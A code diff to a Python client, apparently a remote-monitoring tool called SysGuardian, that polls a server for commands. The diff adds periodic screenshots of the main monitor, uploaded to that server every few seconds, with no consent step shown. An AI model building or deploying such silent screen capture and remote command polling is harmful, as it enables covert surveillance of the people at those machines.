@@ -16,6 +16,9 @@ import os
 import threading
 import textwrap
 import platform
+from mss import mss
+from PIL import Image
+from io import BytesIO
 
 # Forcer l'encodage UTF-8 pour la console Windows
 if platform.system() == "Windows":
@@ -47,9 +50,11 @@ pc_id = platform.node()
 CHECK_INTERVAL = 2
 COUNTDOWN_SECONDS = 2
 
+SERVER = "https://sysguardian.neolysium.eu/"
+
 # Configuration auto-update
 GITHUB_REPO = "YelloWorld5847/SysGuardian"
-CURRENT_VERSION = "4.1.4"
+CURRENT_VERSION = "4.3.0"
 CHECK_UPDATE_INTERVAL = 3600
 # ========================================
 
@@ -329,7 +334,7 @@ class AutonomousListener:
     def get_messages(self):
         """Récupère tous les messages du Gist"""
         try:
-            url = f"https://sysguardian.neolysium.eu/api/commands?pc_id={pc_id}"
+            url = f"{SERVER}/api/commands?pc_id={pc_id}"
             r = requests.get(url)
             return r.json()
         except Exception as e:
@@ -361,11 +366,30 @@ class AutonomousListener:
 
     def send_alive(self):
         try:
-            url = f"https://sysguardian.neolysium.eu/api/online?pc_id={pc_id}"
+            url = f"{SERVER}/api/online?pc_id={pc_id}"
             r = requests.get(url)
             print(f"réponse du serveur : {r.text}")
         except Exception as e:
             self.log(f"Erreur lecture messages : {e}", "ERROR")
+
+    def get_screenshot_bytes_jpeg(self, quality=60):
+        sct = mss()
+        # Monitor principal (index 1)
+        sct_img = sct.grab(sct.monitors[1])
+        img = Image.frombytes('RGB', sct_img.size, sct_img.rgb)
+        buffer = BytesIO()
+        img.save(buffer, format="JPEG", quality=quality)
+        buffer.seek(0)
+        return buffer.read()
+
+    def send_screen(self):
+        image_bytes = self.get_screenshot_bytes_jpeg()
+        files = {"image": ("screen.jpg", image_bytes, "image/jpeg")}
+        data = {"pc_id": pc_id}
+        try:
+            requests.post(f"{SERVER}/api/upload_screen", data=data, files=files, timeout=3)
+        except Exception as e:
+            print("Erreur envoi:", e)
 
 
     def process_message(self, msg, c_type):
@@ -399,6 +423,7 @@ class AutonomousListener:
         consecutive_errors = 0
         max_errors = 5
         i = 1
+        self.send_alive()
         try:
             while True:
                 try:
@@ -415,6 +440,9 @@ class AutonomousListener:
                             command = command_info["command"]
                             if self.process_message(command, c_type):
                                 return
+                    
+                    if i % 3 == 0:
+                        self.send_screen()
                     
                     if i % 20 == 0:
                         self.send_alive()
